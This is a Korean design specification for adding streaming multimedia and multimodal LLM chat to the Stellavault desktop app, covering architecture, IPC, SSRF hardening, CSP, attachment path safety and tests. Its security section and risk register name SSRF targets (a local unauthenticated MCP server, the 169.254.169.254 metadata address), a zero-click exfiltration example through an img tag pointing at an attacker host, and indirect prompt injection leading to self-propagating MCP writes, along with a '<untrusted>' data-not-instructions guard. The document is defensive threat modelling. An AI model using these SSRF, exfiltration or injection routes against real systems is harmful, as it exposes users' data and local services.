# 멀티미디어 채팅 설계 (SP0~SP3)

> 작성일: 2026-06-20 · 상태: 설계 검토 대기
> 산출: ultracode 워크플로(`mm-chat-spec-harden`, 9에이전트) provider 멀티모달/스트리밍/미디어/SSRF 정밀 조사 + 4관점 검증 종합

## 1. 개요

Stellavault desktop AI 패널에 **상용 메신저 레벨 멀티미디어 채팅**을 추가한다. 범위 = SP1(멀티턴 채팅)+SP2(멀티미디어 I/O)+SP3(멀티모달 LLM). 에이전트 툴(SP4)은 제외. 키는 기존 secret-store(Track A) 사용.

**검증이 드러낸 핵심**: SP1 스트리밍·SP3 멀티모달은 현 `llm-synthesizer.ts`의 "확장"이 아니라 사실상 재작성(단일 content 문자열→content-block 배열, buffered→SSE, 고정 60s→idle 타임아웃)이다. 따라서 `makeSynthesizer/synthesize(Promise<string>)` 인터페이스는 **보존**하고 `chatStream`을 별도 함수/엔진으로 분리한다(Ask/Wiki 무수정). 그리고 **SP0(선결 인프라)**가 SP2 fetch 기능 전 필수다.

## 2. 아키텍처 (병렬 신설, 3레이어)

기존 Ask/Wiki 합성 경로(core Synthesizer, 단발 buffered)를 건드리지 않고 main에 별도 채팅 표면(`chat-engine.ts`)을 추가.

- **[A] Renderer** (AIPanel 'chat' 탭): `ChatMessage[]` 상태, composer(첨부 트레이), 버블 리스트(가상화), 스트리밍 토큰 점진 렌더(**sanitize 필수**), 출처 칩, 미디어 플레이어. **원격 호스트와 직접 통신 절대 금지** — 모든 원격 바이트는 main이 받아 `app://`로 재서빙.
- **[B] Preload** (contextBridge 경계): `ALLOWED_CHANNELS`/`ALLOWED_EVENTS`가 유일 런타임 보안 경계. 신규 채널 **양쪽 등록 필수**(누락=invoke 거부+on no-op=무음 버그). 드롭 파일은 `webUtils.getPathForFile`로 preload에서 경로 해석 후 비-allowlist 채널로만 전달(렌더러 위조 path arg 금지).
- **[C] Main** (키+모든 네트워크 소유): chat-engine(provider별 SSE 파서+멀티모달 content-block 빌더), 하드닝된 단일 outbound fetcher(unfurl+원격미디어+url-capture 공용, resolve-then-check-IP), 세션 영속(`~/.stellavault/chat/`, atomic), 첨부 vault `attachments/` 저장(path-safety+매직바이트), Whisper 전사 multipart, 스트림 레지스트리 `Map<streamId,{req,wcId}>`.

**불변식**: ①API 키는 main SecretStore에만(write-only 유지) ②RAG/첨부 원문이 off-box로 나가는 유일 지점은 사용자가 선택한 provider — UI 명시 ③CSP는 `'self'`/`app:`/`blob:`로 잠그고 원격 origin 추가 금지.

## 3. 컴포넌트 (파일별 책임)

**신규 (main)**:
- `main/outbound-fetch.ts` — https-only + DNS resolve 후 IP 검사(사설/loopback/link-local/`169.254.169.254`/IPv6 `::1`·`fc00::/7`·매핑·decimal/hex 인코딩) + 리다이렉트 매 홉 재검증(rebinding 방어, maxRedirects≤2) + size/timeout/content-type 캡. `core/api/server.ts`의 string-only `assertNotPrivateUrl`을 이 resolved-IP 버전으로 교체.
- `main/chat-engine.ts` — `ChatMessage[]`→provider 바디 변환 + SSE 스트림 파싱 + 멀티모달 content-block 빌더 + 스트림 레지스트리. provider 파서(anthropic: event+data, `content_block_delta.text_delta`만; openai-compat: data-only, `choices[0].delta.content`, `[DONE]` 센티넬; gemini: `?alt=sse` 필수, `candidates[0].content.parts[].text`).
- `main/chat-session-store.ts` — `~/.stellavault/chat/` 영속. **UUID 파일명**(렌더러/제목 유래 금지), `assertInsideDir` 검증, atomic tmp+rename, 디바운스 저장(턴 종료 시), 미디어 base64 인라인 금지(`attachments/` 참조만), 손상파일 격리.
- `main/transcribe.ts` — OpenAI `/v1/audio/transcriptions` multipart(현 postJson은 json 전용) + Gemini inline 오디오.

**수정 (main/shared/preload)**:
- `main/path-safety.ts` — `assertInsideDir(root,p)` 일반화 추출; `ALLOWED_MEDIA_EXT`(.mp3/.m4a/.wav/.ogg/.webm/.mp4/.mov) + 매직바이트 검증; `.svg`는 미디어/직접-open 경로 제외.
- `shared/ai-providers.ts` — `MODALITY_MATRIX` 상수(provider→{image,audio,video}).
- `shared/ipc-types.ts` + `preload/index.ts` — 신규 채널/이벤트 타입 + **양쪽 allowlist**.
- `renderer/index.html` — CSP에 `media-src 'self' app: blob:` 추가(원격 origin 금지).

**신규 (renderer)**:
- `renderer/components/panels/AIPanel.tsx` (수정) — Tab union/배열에 `'chat'` 추가(현 ask/search/express/decay/stats), i18n.
- `renderer/components/chat/` — ChatView, MessageBubble(sanitize), Composer+AttachmentTray, MediaPlayer, LinkPreviewCard, StickToBottom 훅.
- `renderer/lib/sanitize.ts` — react-markdown+rehype-sanitize 고정 스키마(href `https:`/`app:`만, img src `app://vault`/허용호스트만, `on*` 차단) — 모델 출력·unfurl 메타·캡션 전부 통과.

## 4. 데이터 플로우

- **멀티턴 텍스트**: composer → `invoke('chat:send', {messages, streamId, ragOn})` → main chat-engine: RAG ON이면 `searchEngine.search(최신 user 턴)`→sourcesBlock(slice12+400자, 전체본문 금지) system 주입 → provider 바디(stream:true) → `net.request` SSE → 청크마다 `res.on('data')` 버퍼링+`\n\n` 분할 파싱 → 텍스트 델타를 `e.sender.send('chat:chunk',{streamId,delta})`(broadcast 금지, isDestroyed 체크) → 종료 `chat:done`. 렌더러는 streamId로 자기 버블에만 append.
- **멀티미디어 입력**: 드롭=preload `getPathForFile`로 실경로→비-allowlist 채널 path만(>1-2MB base64 IPC 금지); 붙여넣기=DOM paste(소형만 base64); 피커=`dialog.showOpenDialog`. main이 stat→size/mime/매직바이트 검증→**사용자 "볼트 보관" 액션 시에만** `attachments/` 승격(Discard-First). 메시지엔 vault-상대 참조만.
- **멀티모달 LLM**: main이 첨부 바이트→provider별 content-block(캡 이하만 inline, 초과는 provider 파일 API/거부). 오디오=Whisper 2단계(전사 스피너→사용자 확인/편집→전송) 또는 Gemini 직접. 비디오=Gemini 직접/ffmpeg 폴백/미지원 안내.
- **출력 렌더**: 텍스트=sanitize 마크다운 점진(완성 블록까지만, 미완 펜스 보호). 인라인 미디어=`app://vault/attachments/`. 링크 unfurl=main outbound-fetch→og:meta 평문+og:image 재검증 후 `app://` 캐시(렌더러 원격 URL 하이드레이트 금지).
- **영속**: 스트림 완료 시 단일 소유자 디바운스 세션 JSON(atomic). 멀티턴은 토큰 예산제 캡(오래된 턴/첨부 드롭, 이미지는 N턴 후 텍스트 참조 치환).

## 5. 멀티모달 매트릭스 (단일 상수 `MODALITY_MATRIX`, composer 사전 비활성+툴팁, fail-closed)

| 모달리티 | Anthropic | OpenAI | Google Gemini | Ollama |
|---|---|---|---|---|
| **이미지** | ✓ content `{type:image, source:{base64 media_type / url / file}}`, jpeg/png/gif/webp, 10MB/장 | ✓ `{type:image_url, image_url:{url\|data URL, detail}}`, png/jpeg/webp/gif | ✓ `inline_data{mime_type,data}`(요청<20MB) / file_data, png/jpeg/webp/heic/heif | 모델명 휴리스틱(llava) |
| **오디오** | ✗ 미지원 | ✓ 별도 `/v1/audio/transcriptions`(multipart, 25MB, STT) | ✓ inline 직접(wav/mp3/aac/ogg/flac, 32tok/s) | ✗ |
| **비디오** | ✗ | ✗ | ✓ inline<20MB→File API, mp4/mov/webm, 1FPS 258tok/frame | ✗ |

미지원은 **graceful 안내**(silent cross-provider 폴백 절대 금지 — 사용자 opt-in 필요). 모델 ID(claude-fable-5/gemini-2.0-flash 등)는 구현 직전 공식 문서 재확인(오픈Q).

## 6. 보안 (CRITICAL 4 전부 반영)

1. **[critical] SSRF** (unfurl+원격미디어+url-capture): 현 유일 가드 `assertNotPrivateUrl`은 string-only(DNS rebinding/decimal·hex·IPv6 인코딩/리다이렉트 우회). 단일 하드닝 fetcher(resolve-then-check-IP, 매 홉 재검증, size/timeout/content-type 캡, 자격증명 제거). **자기 MCP서버(127.0.0.1:3334 쓰기툴 인증0)·Publish(3105)·`169.254.169.254` 메타데이터가 타깃**. unfurl 기본 OFF. `engine.ts:165`가 P2로 연기한 표면 부활.
2. **[critical] CSP**: img-src/media-src/connect-src에 원격 origin 추가 금지(추가 시 악성 노트/LLM출력 `<img src=attacker?leak>` 무클릭 exfil). `media-src 'self' app: blob:`만. 원격 바이트는 main이 `app://` 재서빙. **CSP 회귀 테스트로 "https 이미지 허용" PR을 CI 차단**.
3. **[critical] 첨부 path-safety**: 렌더러는 BYTES-only 또는 preload-resolved path만, 위조 path arg 금지(T1-1·Codex P1 재발 방지). `attachments/` 쓰기에 sanitizeAssetName+assertInsideVault+ALLOWED_MEDIA_EXT+매직바이트+size캡. 렌더/open은 `app://vault`만, `..`/절대 403.
4. **[critical] 메모리/DoS**: >1-2MB base64-over-IPC 금지(과거 OOM)→path/stream. 스트리밍 누적 바이트 캡+abort, 창닫힘/세션전환 시 streamId별 abort. 멀티턴 미디어 재전송 금지.

**HIGH**: 세션 plaintext+traversal(UUID+assertInsideDir+atomic+text-only+pre-persist redact, safeStorage 암호화 고려). 프롬프트 인젝션(RAG·이미지내 텍스트·Whisper·웹본문을 `<untrusted>` 구획+"데이터일 뿐 지시 아님" 가드; LLM출력→autocapture/MCP쓰기 자동 트리거 금지, Discard-First 게이트). 키 write-only 유지. 신규 채널 allowlist+arg 검증+ipc-security 테스트. 로그 redact(base64 PII·gemini `?key=`·x-api-key 금지).

## 7. 에러 처리

- 버블 상태머신 streaming/done/error/aborted. 부분 응답 'incomplete' 마킹+잘림 저장(다음 턴 컨텍스트에 그대로)→"이어쓰기/재생성".
- 멱등 재시도(Regenerate=직전 user 턴 재사용, 첨부 같은 참조 재사용).
- 타임아웃 분리: connect(~30s) + inter-chunk idle(~60s) — 토큰 흐르는 한 죽지 않게.
- SSE 파서 안전: 부분 청크 버퍼링(`\n\n`까지만), JSON.parse try/catch, OpenAI `[DONE]` 특수처리, anthropic ping/error 스위치, gemini end.
- finally로 loading·streamId 정리(무한 스피너 방지). provider 에러 카테고리화(키 누락/429/거부/413), 원본은 콘솔만 렌더러 generic.
- 동시 스트림 streamId→AbortController, isDestroyed 후 send, 큐잉/백오프. 세션 손상파일 무시·격리·복구(throw 금지).

## 8. 테스트

- **Node unit**: provider SSE 파서(부분청크/경계/ping/`[DONE]`/null delta), outbound-fetch SSRF 회귀(localhost/169.254.169.254/RFC1918/IPv6/decimal·hex/리다이렉트→사설 거부, DNS rebinding), path-safety(ALLOWED_MEDIA_EXT/매직바이트/.svg제외/traversal 403), 세션 store(UUID/atomic/복구), ipc-security(신규 채널 양쪽 allowlist), CSP 회귀(원격 origin 미포함), 토큰 예산제.
- **Manual Browser Gate**(필수, Node 0% 검출): ①인라인 이미지 ②오디오 재생 ③비디오 재생+시킹(Range) ④스트림 점진 ⑤Stop 즉시 abort ⑥스크롤 auto-follow 해제+jump ⑦붙여넣기 첨부 ⑧Whisper 스피너→편집 ⑨RAG 토글 ⑩동시 재생 차단.
- **Feature E2E**: 비로그인/키없음/로컬(ollama)/원격(claude) 4상태 × 첨부 전송→세션 반영, 미지원 graceful.
- **Threat Model Gate**: 악의입력/DoS/프라이버시/신뢰악용(LLM→MCP 자기증식)/무결성 5문항.

## 9. Decomposition (SP0→SP1→SP2→SP3)

각 SP는 tsc clean + vitest + smoke + 해당 Manual Gate 통과 후 다음 진행.

- **SP0 (선결 인프라)**: ①`outbound-fetch.ts` 하드닝 fetcher + `assertNotPrivateUrl` resolved-IP 교체 ②`path-safety` `assertInsideDir` 추출 + `ALLOWED_MEDIA_EXT` + 매직바이트 ③CSP `media-src` 추가 + CSP 회귀 테스트. (SSRF/CSP/path는 모든 후속의 전제)
- **SP1 (멀티턴 채팅 토대)**: ④`chat-engine.ts` provider SSE 파서(단위테스트) + 멀티턴 바디 빌더(ask 무수정) ⑤채널 `chat:send/chunk/done/error/abort` + streamId 레지스트리 + 양쪽 allowlist ⑥`chat-session-store.ts`(UUID+atomic) ⑦AIPanel 'chat' 탭 + ChatView/MessageBubble/Composer + `sanitize.ts` + stick-to-bottom ⑧RAG 토글(기본 ON, sourcesBlock 재사용, 토큰 예산제) ⑨세션 목록/이름변경/삭제. Manual: 스트림·Stop·스크롤.
- **SP2 (멀티미디어 I/O)**: ⑩입력=드롭/붙여넣기/피커, >1-2MB path-only, attachments/ 승격(Discard-First) ⑪출력=인라인 이미지/오디오/비디오 app://(Range)+AttachmentTray ⑫링크 unfurl(SP0 fetcher, 기본 OFF, app:// 캐시). Manual: 재생+시킹+붙여넣기.
- **SP3 (멀티모달 LLM)**: ⑬MODALITY_MATRIX + composer 사전 비활성 ⑭content-block 빌더(이미지) ⑮`transcribe.ts` Whisper 2단계(오디오) ⑯gemini 비디오/ffmpeg 폴백 결정(ADR) + graceful. Manual: 각 모달리티 실제 응답·미지원 안내.

## 10. 리스크 등록부

| # | 리스크 | severity | 완화 |
|---|---|---|---|
| 1 | unfurl/원격미디어 SSRF → 자기 MCP(인증0)·메타데이터 도달 | critical | SP0 하드닝 fetcher 선결 후 SP2. unfurl 기본 OFF, web-clipper식 우선 |
| 2 | CSP 원격 origin 추가 시 무클릭 exfil | critical | media-src 'self' app: blob:만, app:// 재서빙, CSP 회귀테스트 |
| 3 | 렌더러 path arg 임의파일(~/.ssh, secrets.enc) 복사 | high | BYTES/preload-resolved만, sanitize+assertInsideVault+매직바이트 |
| 4 | base64 IPC 대용량+멀티턴 재전송 OOM | high | >1-2MB path/stream, size캡, 누적캡+abort, 예산제 드롭 |
| 5 | 세션 plaintext+traversal+동시쓰기 손상 | high | UUID+assertInsideDir+atomic+text-only+redact |
| 6 | RAG ON+멀티모달 토큰 폭증→413/비용/로컬 절단 환각 | high | 토큰 예산제, 최신턴만/캐시, RAG OFF 1클릭, 로컬 num_ctx 경고 |
| 7 | 오염첨부/Whisper/웹본문 간접 인젝션→MCP쓰기 자기증식 | high | `<untrusted>` 구획+가드, 쓰기액션 Discard-First 게이트, sanitize |
| 8 | 스트리밍 invoke 불가(인터리브/고아 net.request 과금/destroyed send) | high | streamId 레지스트리+chat:abort+isDestroyed+before-quit abort |
| 9 | silent cross-provider 폴백으로 첨부 3자 유출 | medium | fail-closed MODALITY_MATRIX, opt-in 후에만 |
| 10 | ffmpeg 의존이 SDK-less·asar 원칙 충돌 | medium | 비디오 gemini-only 우선, ffmpeg는 ADR 후 unpacked |
| 11 | 신규 채널 allowlist 한쪽 누락 무음버그 | low | 양쪽 동시 등록 + 존재 assertion 테스트 |

## 11. 오픈 퀘스천 (구현 전 결정)

1. **비디오**: ffmpeg 번들(SDK-less·asar 충돌) vs "gemini-only, 그외 미지원" 단순화 — **ADR 필요**. (제안: gemini-only 우선)
2. **링크 unfurl**: main 서버사이드 fetch(SSRF 하드닝 필수) vs web-clipper식 "브라우저 가진 메타만"(SSRF 회피) — **ADR**. (제안: 기본 OFF + 하드닝 fetcher)
3. **세션 암호화**: safeStorage 암호화 vs plaintext+pre-persist redact (사용자가 키/PII 붙여넣을 가능성). (제안: text-only+redact, 암호화 후속)
4. **채팅 UI 위치**: 좁은 우측 AIPanel 탭 vs EditorArea 중앙/팝아웃(인라인 비디오·링크카드가 200-360px에 끼임). (제안: AIPanel 탭 우선, 팝아웃 후속)
5. **RAG 전략**: 매 턴 검색 vs 최신 user 턴만/팔로업 스킵 — 토큰·레이턴시·임베더 부하.
6. **트렁케이션**: last-N vs rolling summary vs 토큰 예산.
7. **ollama 모달리티**: 모델명 휴리스틱(llava) vs `/api/show` 메타 조회.
8. **모델 ID 유효성**: 현 ai-providers.ts 값이 멀티모달/스트리밍 실호출에 유효한지 구현 직전 재확인.
9. **동시 스트림 캡**: 단일 유료키 429 방지 상한(제안: 2-3).

## 출처
워크플로 `wf_abd1b78d-c94` 산출(`tasks/w3ur8f4tu.output`) — provider 공식 문서(Anthropic/OpenAI/Google), SSE 스펙, electron webUtils.
